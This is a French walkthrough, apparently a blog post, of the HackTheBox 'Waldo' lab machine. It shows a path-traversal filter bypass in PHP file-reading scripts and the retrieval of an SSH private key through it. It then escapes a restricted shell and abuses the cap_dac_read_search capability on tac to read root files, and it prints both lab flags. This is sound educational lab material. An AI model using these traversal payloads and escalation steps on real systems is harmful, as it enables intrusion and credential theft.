# Solution du CTF Waldo de HackTheBox

Il était où hein le Charlie ?
-----------------------------

Un port SSH, un port HTTP... difficile de faire plus classique comme début.  

Sur la page d'index un système de gestion de listes :  

![Waldo CTF HackTheBox list manager](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/waldo_list_manager.png)

En ouvrant les dev-tools on trouve des requêtes XHR comme cette requête vers *dirRead.php* pour lister les listes et qui sent bon le path traversal :  

![Waldo CTF HackTheBox list manager XHR](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/waldo_xhr.png)

Si on accède à une liste c'est *fileRead.php* qui est appelé. Même pressentiment :)  

Le plus pratique est d'intercepter la requête à travers [Zed Attack Proxy](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) pour pouvoir ensuite l'éditer et la retransmettre.  

On remarque vite une particularité si on tente de remonter dans le path :  

```plain
path= => [".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
path=. => [".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
path=.. => [".","..","html","localhost"]
path=../.. => [".","..","html","localhost"]
path=../../ => [".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
```

Au boût d'un moment on revient au répertoire courant, il y a donc un *str\_replace()* qui doit corriger notre path.  

Si on part de l'idée que le filtre est sur ../../ alors on peut le précéder de .. et ajouter un / final ainsi la suite de caractères ..../..// correspondra à une remontée dans l’arborescence :  

```plain
path=..../..//..../..// => [".","..","cache","empty","lib","local","lock","log","opt","run","spool","tmp","www"]
path=..../..//..../..//..../..// => [".","..",".dockerenv","bin","dev","etc","home","lib","media","mnt","proc","root","run","sbin","srv","sys","tmp","usr","var"]
```

On se balade jusqu'à ce dossier :  

```plain
path=..../..//..../..//..../..//home/nobody
[".","..",".ash_history",".ssh",".viminfo","l.sh","user.txt"]
```

Et dans le dossier *.ssh* on voit un fichier *.monitor* qui s'avère être... la clé privée SSH :)  

Pour obtenir le contenu la même faille est présente sur l'autre script ce qui nous amène à cette requête :  

```plain
POST http://10.10.10.87/fileRead.php HTTP/1.1
file=..../..//..../..//..../..//home/nobody/.ssh/.monitor
```

Free Charlie
------------

```plain
$ ssh -i waldo.key nobody@10.10.10.87
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.
waldo:~$ id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
```

Hmmm Charlie semble être enfermé dans un environnement *Docker* (*Alpine* est une version de Linux souvent utilisée dans ces envs parce que très allégée).  

Cela est très vite confirmé avec les interfaces réseau :  

```plain
docker0   Link encap:Ethernet  HWaddr 02:42:D3:28:1C:FD
          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
      RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

L'accès est suffisant pour avoir le flag utilisateur (*32768bcd7513275e085fd4e7b63e9d24*).  

Prends la clé ! Sors sors !
---------------------------

Dans la liste des *authorized\_keys* de notre compte *nobody* se trouve une référence à un certain *monitor* :  

```plain
ssh-rsa AAAAB3NzaC1---snip---Y4jBHvf monitor@waldo
```

Si on réutilise la clé pour accéder au serveur SSH depuis le docker :  

![Waldo CTF HackTheBox monitor ssh account ascii art](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/waldo_ascii_art.png)

On peut facilement bypasser le lancement du rbash (un bash restreint) en spécifiant le shell que l'on souhaite à SSH (on utilisera ici les options -t bash --noprofile).  

On obtient un shell à première vue limitée mais il s'agit en réalité du PATH peu remplis, ce qui est vite corrigé :  

```plain
monitor@waldo:~$ echo $PATH
/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
monitor@waldo:~$ export PATH=/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin:$PATH
```

Say Cap-tain, Say wut ?
-----------------------

Après avoir tourné un moment à chercher un chemin classique d'exploitation il est temps de se pencher sur les fichiers présents dans le dossier app-dev.  

On trouve un exécutable *logMonitor* à l'usage suivant :  

```plain
Usage: logMonitor [-aAbdDfhklmsw] [--help]
```

Contrairement à ce qu'on pouvait espérer l'option *--help* ne donne pas d'aide détaillée mais qu'importe puisque le code C est aussi présent :  

```c
{"auth", no_argument, 0, 'a'},
{"alternatives", no_argument, 0, 'A'},
{"btmp", no_argument, 0, 'b'},
{"dpkg", no_argument, 0, 'd'},
{"daemon", no_argument, 0, 'D'},
{"faillog", no_argument, 0, 'f'},
{"help", no_argument, 0, 'h'},
{"kern", no_argument, 0, 'k'},
{"lastlog", no_argument, 0, 'l'},
{"messages", no_argument, 0, 'm'},
{"syslog", no_argument, 0, 's'},
{"wtmp", no_argument, 0, 'w'},
```

En fonction de l'option choisie un path hardcodé est recopié vers une variable *filename*. Une fonction *printFile* est ensuite appelée qui affiche le fichier demandé via une boucle avec *fgetc* et *printf* (beurk).  

Parmi les paths correspondantq aux options on trouve */var/log/auth.log*, */var/log/faillog*, */var/log/wtmp*, etc autant dire des fichiers généralement pas accessibles à tout le monde.  

D'ailleurs si on lance *logMonitor -f* pour obtenir le *faillog* on obtient le message d'erreur *Cannot open file*.  

Le binaire n'est pas setuid et sudo n'est pas installé... logique quoi.  

En revanche une fois dans le sous dossier *v0.1* le binaire *logMonitor-0.1* parvient à lire le fichier... avec les mêmes observations (il n'est pas setuid) so what the fuck !?  

On fait un *getcap* dessus pour lister ses [capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html) et surprise :  

```plain
logMonitor-0.1 = cap_dac_read_search+ei
```

Ce programme a le super-pouvoir d'accéder à n'importe quel fichier du système en se moquant bien des permissions.  

Mais après avoir bien épluché le code C ce dernier ne semble pas faillible. Je ne suis pas au point sur les détails de fonctionnement des *capabilities* alors dans le doute j'ai tenté de hooker l'appel à *puts()* dans le code (via un *LD\_PRELOAD*) mais sans trop de surprises ça n'a pas été pris en compte.  

Finalement il fallait faire un gros *getcap* sur le disque pour trouver un autre binaire avec les même super-pouvoirs :  

```plain
monitor@waldo:~/app-dev$ getcap -r / 2> /dev/null
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei

monitor@waldo:~/app-dev$ tac /root/root.txt
8fb67c84418be6e45fbd348fd4584f6c
```


*Published December 15 2018 at 19:09*